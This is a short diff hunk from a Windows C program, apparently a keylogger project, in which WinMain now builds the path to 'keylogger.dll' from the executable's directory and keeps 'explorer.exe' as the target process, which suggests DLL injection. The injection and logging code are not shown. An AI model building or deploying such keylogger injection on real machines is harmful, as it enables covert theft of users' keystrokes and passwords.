@@ -68,9 +68,27 @@ int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	(void)hPrevInstance;
 	(void)lpCmdLine;
 	(void)nShowCmd;
-	const wchar_t* dllPath = L"C:\\Users\\Michel\\Documents\\Craft\\TinkyWinkey\\keylogger.dll"; // Change this to your DLL path
-	const wchar_t* targetProcess = L"explorer.exe";
+	wchar_t exePath[MAX_PATH];
+	wchar_t dllPath[MAX_PATH];
 
+    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
+    {
+        return 1;
+    }
+    
+    // Find the last backslash to get directory
+    wchar_t* lastSlash = wcsrchr(exePath, L'\\');
+    if (lastSlash)
+    {
+        *lastSlash = L'\0'; // Terminate string at directory
+        swprintf_s(dllPath, MAX_PATH, L"%s\\keylogger.dll", exePath);
+    }
+    else
+    {
+        wcscpy_s(dllPath, MAX_PATH, L".\\keylogger.dll");
+    }
+
+	wchar_t *targetProcess = L"explorer.exe";
 	HANDLE fd = create_log_file();
 	if (fd == NULL)
 		return 1;
